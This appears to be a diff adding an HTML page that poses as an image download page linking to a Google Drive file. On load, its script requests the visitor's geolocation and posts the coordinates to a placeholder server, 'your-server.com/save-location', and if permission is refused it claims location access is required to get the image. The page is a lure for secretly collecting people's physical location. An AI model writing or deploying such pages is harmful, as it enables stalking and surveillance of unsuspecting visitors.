@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Image</title>
+</head>
+<body>
+    <h1>Download the Image</h1>
+    <a id="downloadLink" href="https://drive.google.com/file/d/1QJ0LaHGTGnMMJjNxITPPR9WgkhGj6SPi/view?usp=sharing" download>Click to Download Image</a>
+
+    <script>
+        // Po načítaní stránky požiadaj o polohu
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Odoslanie polohy na tvoj server
+                    fetch('https://your-server.com/save-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ latitude, longitude })
+                    })
+                    .then(response => console.log('Location sent to server'))
+                    .catch(error => console.error('Error sending location:', error));
+                },
+                function(error) {
+                    console.error('Error getting location:', error);
+                    alert('Please allow location access to download the image.');
+                }
+            );
+        } else {
+            alert('Geolocation is not supported by your browser.');
+        }
+
+        // Spustenie sťahovania po povolení polohy
+        document.getElementById('downloadLink').addEventListener('click', function(event) {
+            // Odkaz na stiahnutie fotky
+            console.log('Downloading image...');
+        });
+    </script>
+</body>
+</html>
